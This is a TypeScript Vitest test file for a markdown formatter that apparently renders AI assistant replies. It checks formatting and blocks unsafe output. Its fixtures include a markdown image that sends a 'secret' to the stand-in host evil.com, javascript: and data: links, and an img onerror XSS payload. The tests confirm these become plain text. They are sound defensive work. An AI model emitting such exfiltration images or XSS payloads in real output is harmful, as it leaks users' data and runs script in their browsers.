import fs from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import { formatar } from "./formatacao";

const texto = (v: string) => ({ t: "texto", v });

describe("formatação mínima da resposta", () => {
  it("título, lista e negrito", () => {
    expect(formatar("## Resumo\n- **Agenda**\n- Treinos")).toEqual([
      { t: "titulo", nivel: 2, v: [texto("Resumo")] },
      { t: "lista", ordenada: false, itens: [[{ t: "negrito", v: [texto("Agenda")] }], [texto("Treinos")]] },
    ]);
  });

  it("normaliza título de nível um e conserva o nível três", () => {
    expect(formatar("# A\n### B")).toEqual([
      { t: "titulo", nivel: 2, v: [texto("A")] },
      { t: "titulo", nivel: 3, v: [texto("B")] },
    ]);
  });

  it("aceita lista por asterisco e lista ordenada em blocos distintos", () => {
    expect(formatar("* Um\n* Dois\n1. Três\n2. Quatro")).toEqual([
      { t: "lista", ordenada: false, itens: [[texto("Um")], [texto("Dois")]] },
      { t: "lista", ordenada: true, itens: [[texto("Três")], [texto("Quatro")]] },
    ]);
  });

  it("imagem externa vira só texto alternativo; nenhum nó carrega a URL", () => {
    const arvore = formatar("![x](https://evil.com/?d=segredo)");
    expect(arvore).toEqual([{ t: "paragrafo", v: [texto("x")] }]);
    expect(JSON.stringify(arvore)).not.toMatch(/evil\.com|segredo|href/);
  });

  it.each(["https://evil.com", "//evil.com", "/\\evil.com", "javascript:alert", "data:text/html,x", "/\t/evil.com", "/\r/evil.com", "/financeiro\\fora"])("link recusado vira texto: %s", (url) => {
    expect(formatar("[clique](" + url + ")")).toEqual([{ t: "paragrafo", v: [texto("clique")] }]);
  });

  it("imagem interna também não vira link", () => {
    expect(formatar("![ver](/financeiro)")).toEqual([{ t: "paragrafo", v: [texto("ver")] }]);
  });

  it("link interno aceito vira link, com ênfase no rótulo", () => {
    expect(formatar("[**ver**](/financeiro)")).toEqual([
      { t: "paragrafo", v: [{ t: "link", href: "/financeiro", v: [{ t: "negrito", v: [texto("ver")] }] }] },
    ]);
  });

  it("HTML cru continua literal", () => {
    const html = '<img src=x onerror=alert(1)>';
    expect(formatar(html)).toEqual([{ t: "paragrafo", v: [texto(html)] }]);
  });

  it("texto sem marcação vira um parágrafo igual ao original", () => {
    expect(formatar("Texto simples, com acentos e R$ 300.")).toEqual([
      { t: "paragrafo", v: [texto("Texto simples, com acentos e R$ 300.")] },
    ]);
  });

  it("linha simples quebra; linha em branco separa parágrafos, inclusive em CRLF", () => {
    expect(formatar("Um\r\nDois\r\n\r\nTrês")).toEqual([
      { t: "paragrafo", v: [texto("Um"), { t: "quebra" }, texto("Dois")] },
      { t: "paragrafo", v: [texto("Três")] },
    ]);
    expect(formatar("\n\n")).toEqual([]);
  });

  it("itálico por asterisco e sublinhado, código literal e ênfase dentro de negrito", () => {
    expect(formatar("*um* _dois_ \u0060**três**\u0060 **quatro _cinco_**")).toEqual([
      { t: "paragrafo", v: [
        { t: "italico", v: [texto("um")] }, texto(" "),
        { t: "italico", v: [texto("dois")] }, texto(" "),
        { t: "codigo", v: "**três**" }, texto(" "),
        { t: "negrito", v: [texto("quatro "), { t: "italico", v: [texto("cinco")] }] },
      ] },
    ]);
  });

  it("número com asterisco, sublinhado em palavra e delimitadores abertos não quebram", () => {
    for (const entrada of ["5 * 3", "chave_com_sublinhado", "**sem fechar", "texto * só * texto"]) {
      expect(formatar(entrada)).toEqual([{ t: "paragrafo", v: [texto(entrada)] }]);
    }
  });

  it("o renderizador usa JSX e Link sem inserir HTML nem carregar imagens", () => {
    const componente = fs.readFileSync(path.resolve(__dirname, "../../components/ai/resposta-formatada.tsx"), "utf8");
    expect(componente).not.toContain("dangerouslySetInnerHTML");
    expect(componente).not.toMatch(/<img\b|<Image\b/);
    expect(componente).toContain('from "next/link"');
    expect(componente).toContain("formatar(texto)");
  });
});
